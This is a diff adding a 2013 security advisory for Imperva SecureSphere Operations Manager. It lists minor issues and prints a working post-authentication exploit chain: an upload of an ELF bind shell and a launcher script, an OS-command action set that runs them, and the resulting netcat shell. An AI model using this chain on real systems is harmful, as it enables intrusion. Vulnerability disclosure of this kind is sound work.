@@ -1,0 +1,315 @@
+Original: http://www.digitalsec.net/stuff/explt+advs/Imperva-SecureSphere.OptMgr.txt
+
+
+          ===============================
+                   - Advisory -
+          ===============================
+
+  Tittle:   Imperva SecureSphere Operations Manager - Command
+Execution (Post Authentication) & Minor issues
+    Risk:   High
+    Date:   27.May.2013
+  Author:   Pedro Andujar
+
+
+.: [ INTRO ] :.
+
+SecureSphere Operations Manager (SOM) is a multi-domain, federated
+management solution that dramatically improves the operational
+efficiency of managing SecureSphere deployments with multiple MX
+Management Servers. SOM meets the operational scalability
+demands of large enterprises and Managed Security Service Providers by
+consolidating the management, visibility and reporting
+across multiple SecureSphere MX Management Servers, and provides
+system wide health metrics and statistics.
+
+
+.: [ TECHNICAL DESCRIPTION ] :.
+
+Imperva SecureSphere Operations Manager version 9.0.0.5 Enterprise
+Edition and probably others are prone to several security issues
+as described below;
+
+
+.: [ ISSUE #1 }:.
+
+Name: Autocomplete atribute not disabled in login page
+Severity: Low
+
+AUTOCOMPLETE is not disabled on the /secsphLogin.jsp page. This
+prevents the web browser specifically caching the username and
+j_password fields.
+
+<tr> <td style="width: 120px"> <h1 class="login">User:</h1> </td> <td>
+<input size=30 id="username" type='text' name='j_username'
+style="width:172px" value="andujarp" />
+<script>document.getElementById("username").focus()</script>
+</td> </tr> <tr>
+<td style="width: 120px">
+<h1 class="login">Password:</h1>
+</td> <td>
+<input size=30 type='password' name='j_password' style="width:172px"/>
+
+
+.: [ ISSUE #2 }:.
+
+Name: Sensitive information is passed as parameter in URL
+Severity: Low
+
+As part of the login process, the assigned session ID is revealed as a
+URL parameter.
+
+GET /SecureSphere/secsphLogin.jsp;jsessionid=8B4AE9F3C99049824D4AEBBF61DEF6A5
+HTTP/1.1
+
+
+Additionally, the some credentials are revealed as a URL parameter
+when trying to get the details of a sensor device:
+
+GET /SecureSphere/j_acegi_security_check?j_password=5352023200062562773&j_username=SOM-user&remote_login_attempt=true&active_mom_user=andujarp
+
+
+
+.: [ ISSUE #3 }:.
+
+Name: Physical Path Disclosure
+Severity: Low
+
+The SecureSpere web application discloses sensitive system
+information, including file path information, through its exposed
+functionality.
+Specifically, the
+/SecureSphere/dwr/call/plaincall/AsyncOperationsContainer.getOperationState.dwr
+url resource shows the internal
+root path of the underlying Application Server;
+
+HTTP/1.1 200 OK
+Content-type: text/javascript;charset=utf-8
+Content-Length: 554
+Date: Thu, 25 Oct 2013 04:41:38 GMT
+Server: NA
+
+throw 'allowScriptTagRemoting is false.';
+//#DWR-INSERT
+//#DWR-REPLY
+var s0={};var s1=[];s0['file_size']="412
+KB";s0.filePath="/opt/SecureSphere/server/SecureSphere/jakarta-tomcat-secsph/webapps/SecureSphere/WEB-INF/reptempt/25CB2F79E342E89AD9A7CFF51AA17F10/1338152502622932642/export.imf"
+
+See also ISSUE #4, where additional file path disclosure occurs.
+
+
+
+.: [ ISSUE #4 }:.
+
+Name: Insufficients checks on file upload
+Severity: High
+
+The SecureSpere web application file upload functionality from the
+.Key Management. section doesn't provide an adequate security control
+of the uploaded
+files, thus allowing an external attacker to upload arbitraty content
+into the server. This can be used as an attacker in combination with
+additional
+vulnerabilities in the application to compromise the Host.
+
+When trying to upload an invalid file in the Key Management section,
+the application shows the full internal path of the application
+server. Additionally,
+it effectively uploads the file, despite being a wrong filetype.
+
+The example below shows the file upload functionality outputting an
+error when the file gets uploaded, additionally revelaing the upload
+filename and its
+internal path within the system. A Linux x86_64 ELF port 2222 bind
+shell and additional shell script are uploaded to /var/tmp dir:
+
+
+POST /SecureSphere/plain/settings.html?__targetView=details&extraParams[Key]=T/keyManagement
+HTTP/1.1
+Host: x.x.x.x:8083
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: https://x.x.x.x:8083/SecureSphere/ui/main.html
+Cookie: JSESSIONID=CBAD5B77716363AFC961614AC32CAD4D
+Content-Type: multipart/form-data;
+boundary=---------------------------6997088307399657971245517506
+Content-Length: 1011
+-----------------------------6997088307399657971245517506
+Content-Disposition: form-data; name="def_name"
+default_key_pair_fips_2
+-----------------------------6997088307399657971245517506
+Content-Disposition: form-data; name="private_key"; filename="bndsh"
+Content-Type: application/octet-stream
+ELF > x@@@8 @@$ j)Xj _j ^HR $ ziHj Zj1Xj2XH1j+XHj ^Hj!Xuj;XH/bin/shSHRWH
+-----------------------------6997088307399657971245517506
+Content-Disposition: form-data; name="public_key"; filename="script"
+Content-Type: application/octet-stream
+file file* | grep ELF | awk '{print $1}' | sed -e 's/://' >target.file
+; chmod 755 `cat target.file` ; ./`cat target.file` ; rm -rf
+target.file
+-----------------------------6997088307399657971245517506
+Content-Disposition: form-data; name="password"
+12321323
+-----------------------------6997088307399657971245517506----------------------------------------------------
+
+
+
+HTTP/1.1 200 OK
+Pragma: no-cache
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Cache-Control: no-cache
+Cache-Control: no-store
+Content-Type: text/xml;charset=UTF-8
+Content-Language: en
+Content-Length: 315
+Date: Fri, 26 Oct 2012 04:38:17 GMT
+Server: NA
+<errors> <global-errors> <global-error path="page">
+An error occurred while importing keys: Failed to load PEM key from
+'/var/tmp/com.mprv.secsph.utils.io1217840423292804321upload.file'..</global-error>
+</global-errors> <field-errors> </field-errors> </errors>
+
+
+
+.: [ ISSUE #5 }:.
+
+Name: Insufficients checks on Action Set (OS command)
+Severity: High
+
+The SecureSphere web applicaiton allows users to create Action Sets
+via the Policies sub menu. Action Sets are components used to define
+the actions taken
+by SecureSphere when specific conditions are met. Action sets include
+session blocks, SNMP traps, sys-tem logs, email, FTP Archive, OS
+Command, etc. An
+attacker can control the execution of commands by creating a task,
+setting an OS command action on assignee change and cycling through
+commands by continuous
+modification of the task assignee. The OS command action allows the
+user to supply very limited commands and arguments to the server host
+and have these
+commands executed within the context of the .mxserver. user. The
+application host is running a modified version of Red Hat Linux, with
+many networking and
+scripting tools installed by default. Due to insufficient host
+hardening and application sandboxing, an attacker is able to execute
+commands. Combining the
+file upload vulnerability explained in issue 4, an attacker can copy
+backdoor into the server filesystem and get it executed through this
+issue, opening a
+shell access to the host as the .mxserver. user. The attacker is able
+to use this foothold into the host to elevate privileges, view and
+modify source code,
+obtain system and application credentials, etc.
+
+
+POST /SecureSphere/plain/actionsets.html HTTP/1.1
+Host: x.x.x.x:8083
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.4.0
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+preffered_encoding: utf-8
+Referer: https://x.x.x.x:8083/SecureSphere/ui/main.html
+Content-Length: 5223
+Cookie: JSESSIONID=ABD89957C38AD685A881670E31A7BF1A
+Pragma: no-cache
+Cache-Control: no-cache
+__targetView=details&currentState=E/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].momSettingsComponent.addToNewMxs=true
+&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionInterface=E/secsph/action-interface\0x5B@dn=\0x27OsCommandAI\0x27\0x5D
+&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].name=rvshell&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map
+[5143764432078707607].actionParams.ownerTable=E/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D,actions.map[5143764432078707607]&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\
+0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map
+
+[command].value=/usr/bin/find
+
+&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[command].ownerTable=E/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D,
+actions.map[5143764432078707607].actionParams&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[command]
+.parameterMetadata=E/secsph/generic-action-interface-metadata\0x5B@dn=\0x27OsCommand\0x27\0x5D,interfaceParameters.map[command]&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\
+0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[command].name=command&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map
+[5143764432078707607].actionParams.parameters.map
+
+[arguments].value=-name file\* -exec sh {} \;
+
+&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[arguments].ownerTable=E/secsph/action-set\0x5B@dn=\0x271914115513\0x27\
+0x5D,actions.map[5143764432078707607].actionParams&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[arguments]
+.parameterMetadata=E/secsph/generic-action-interface-metadata\0x5B@dn=\0x27OsCommand\0x27\0x5D,interfaceParameters.map[arguments]&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\
+0x5D].actions.map[5143764432078707607].actionParams.parameters.map[arguments].name=arguments&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map
+
+[workingDir].value=/var/tmp
+
+&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[workingDir].ownerTable=E/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D,actions.map[5143764432078707607].actionParams&data
+[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[workingDir].parameterMetadata=E/secsph/generic-action-interface-metadata\0x5B
+@dn=\0x27OsCommand\0x27\0x5D,interfaceParameters.map[workingDir]&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[workingDir]
+.name=workingDir&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[shouldRunAlways].value=true&data[actionsets][/secsph/action-set\0x5B
+@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[shouldRunAlways].ownerTable=E/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D,actions
+.map[5143764432078707607].actionParams&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[shouldRunAlways]
+.parameterMetadata=E/secsph/generic-action-interface-metadata\0x5B@dn=\0x27OsCommand\0x27\0x5D,interfaceParameters.map[shouldRunAlways]&data[actionsets][/secsph/action-set\0x5B@dn=
+\0x271914115513\0x27\0x5D].actions.map[5143764432078707607].actionParams.parameters.map[shouldRunAlways].name=shouldRunAlways&data[actionsets][/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D]
+.actions.map[5143764432078707607].ownerTable=E/secsph/action-set\0x5B@dn=\0x271914115513\0x27\0x5D&_=
+
+
+In the example above, we have set an event action-set, and as soon the
+event happens it will launch the predefined action (/usr/bin/find .
+-exec sh {})
+which will execute sh over all the files existing in /var/tmp.  As we
+were able to upload arbitrary content within the local filesystem by
+means of the
+issue 4, the following script that was previously uploaded will be
+executed as well:
+
+file file* | grep ELF | awk '{print $1}' | sed -e 's/://' >target.file
+; chmod 755 `cat target.file` ; ./`cat target.file` ; rm -rf
+target.file
+
+The script will find, rename and execute the bind tcp shell that was
+uploaded before, allowing us to access through an interactive Linux
+shell in port 2222,
+with the privileges of mxserver.
+
+
+[crg@fogheaven ~]$ nc x.x.x.x 2222
+uname -a;id
+Linux xxxxx.xxxx.xx 2.6.18-164.15.1.el5.impl #1 SMP Tue Apr 27
+20:46:55 IDT 2010 x86_64 x86_64 x86_64 GNU/Linux
+uid=502(mxserver)gid=505(mxserver)groups=505(mxservers)
+
+
+
+
+.: [ CHANGELOG ] :.
+
+  * 25/Oct/2012:   - Audit done, reported to client.
+  * 27/May/2013:  - Sent to Imperva.
+  * 02/Jun/2013:   - Public Disclosure.
+
+.: [ SOLUTIONS ] :.
+
+N/A
+
+
+.: [ REFERENCES ] :.
+
+   [+] Imperva SecureSphere Operations Manager
+    http://www.imperva.com/products/mgt_operations-manager.html
+
+   [+] Security Target Document
+    http://www.niap-ccevs.org/st/st_vid10466-st.pdf
+
+   [+] Ernst & Young Advanced Security Centre - Melbourne
+    http://www.ey.com/security/
+
+   [+] !dSR - Digital Security Research
+    http://www.digitalsec.net/
+
+
+
+
+                    -=EOF=-
